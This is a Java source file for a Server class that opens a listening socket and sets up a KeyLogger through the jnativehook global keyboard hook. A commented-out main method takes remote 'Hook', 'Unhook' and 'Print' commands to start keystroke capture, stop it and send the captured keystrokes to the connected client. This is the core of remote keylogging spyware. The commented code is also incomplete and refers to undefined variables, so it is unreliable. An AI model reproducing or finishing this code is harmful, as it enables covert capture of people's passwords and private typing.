package model;

import java.io.*;
import java.net.*;
import java.util.Scanner;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

public class Server {
    private ServerSocket serverSock;
    private Socket clientSock;
    private InputStream inputStream;
    private OutputStream outputStream;
    private KeyLogger keyLogger;

    public Server(int port, int backlog) {
        createServerSocket(port, backlog);
        keyLogger = new KeyLogger();
    }

    private void createServerSocket(int port, int backlog) {
        try {
            serverSock = new ServerSocket(port, backlog);
        }
        catch (IOException e) {
            e.printStackTrace();
        }

    }

    private void acceptClient() {
        try {
            clientSock = serverSock.accept();
            inputStream = clientSock.getInputStream();
            outputStream = clientSock.getOutputStream();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    // public static void main(String[] args) {
    //     try {
    //         try {
    //             GlobalScreen.registerNativeHook();
    //         }
    //         catch (NativeHookException ex) {
    //             System.err.println("There was a problem registering the native hook.");
    //             System.err.println(ex.getMessage());
    //
    //             System.exit(1);
    //         }
    //
    //
    //         Scanner sc = new Scanner(System.in);
    //
    //         String command = "";
    //         boolean isHooked = false;
    //
    //         while (!command.trim().equals("Exit"))
    //         {
    //             byte[] buffer = new byte[100];
    //             is.read(buffer);
    //             command = new String(buffer);
    //             command = command.trim();
    //
    //             switch(command) {
    //                 case "Hook":
    //                     if (isHooked == false) {
    //                         GlobalScreen.addNativeKeyListener(kl);
    //                         System.out.println("Add native key listener");
    //                         isHooked = true;
    //                     }
    //                     break;
    //                 case "Unhook":
    //                     if (isHooked == true) {
    //                         GlobalScreen.removeNativeKeyListener(kl);
    //                         System.out.println("Remove native key listener");
    //                         kl.clearLogs();
    //                         isHooked = false;
    //                     }
    //                     break;
    //                 case "Print":
    //                     System.out.println("laksdjf");
    //                     String out = "";
    //                     for (int i = 0; i < kl.logs.size(); i++) {
    //                         out += kl.logs.get(i);
    //                     }
    //                     byte[] tmp = out.getBytes();
    //                     os.write(tmp);
    //                     break;
    //             }
    //         }
    //
    //         try {
    //             GlobalScreen.unregisterNativeHook();
    //         } catch (NativeHookException nativeHookException) {
    //             nativeHookException.printStackTrace();
    //         }
    //
    //         sock.close();
    //         System.out.println("Socket closed");
    //     }
    //     catch (IOException ioE) {
    //         ioE.printStackTrace();
    //     }
    // }
}
